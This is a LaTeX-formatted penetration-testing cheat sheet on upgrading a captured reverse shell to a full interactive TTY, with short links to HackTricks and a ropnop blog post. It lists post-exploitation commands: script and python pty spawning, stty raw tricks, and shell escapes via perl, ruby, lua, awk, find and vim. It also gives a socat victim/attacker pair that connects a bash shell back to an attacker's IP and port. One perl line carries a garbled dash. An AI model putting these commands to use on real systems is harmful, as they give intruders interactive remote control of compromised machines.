
\section{Full TTY}

\url{https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys}

\subsection{script}

\begin{verbatim}
script /dev/null -c bash
^Z
stty raw -echo; fg
\end{verbatim}


\begin{verbatim}
script -qc /bin/bash /dev/null
(inside the nc session) CTRL+Z
stty raw -echo; fg; ls; export SHELL=/bin/bash;
export TERM=screen; stty rows 38 columns 116; reset;
\end{verbatim}



 \subsection{Python}
\begin{verbatim}
python3 -c 'import pty; pty.spawn("/bin/bash")'
\end{verbatim}


\subsection{netcat with magic}

\url{https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/}

First, follow the same technique as in Method 1 and use Python to spawn a PTY.
Once bash is running in the PTY, background the shell with \verb+Ctrl-Z+

\begin{verbatim}
python3 -c 'import pty; pty.spawn("/bin/bash")'
(inside the nc session) CTRL+Z
stty raw -echo; fg; 
export SHELL=/bin/bash;export TERM=screen; stty rows 38 columns 116; reset;
export SHELL=/bin/bash;export TERM=xterm-256color; stty rows 38 columns 116; reset;
\end{verbatim}




\subsection{Socat}

\subsubsection{Victim}
\verb+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:IP:PORT+
\subsubsection{Attacker}

\verb+socat file:`tty`,raw,echo=0 tcp-listen:PORT+

\subsection{perl, ruby and others}
\begin{verbatim}
/bin/sh -i

perl â€”e 'exec "/bin/sh";'
perl: exec "/bin/sh";


ruby: exec "/bin/sh"

lua: os.execute('/bin/sh')

awk 'BEGIN {system("/bin/sh")}'

find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
find . -exec /bin/sh \; -quit

vim -c ':!/bin/sh'

vim
:set shell=/bin/sh
:shell
\end{verbatim}
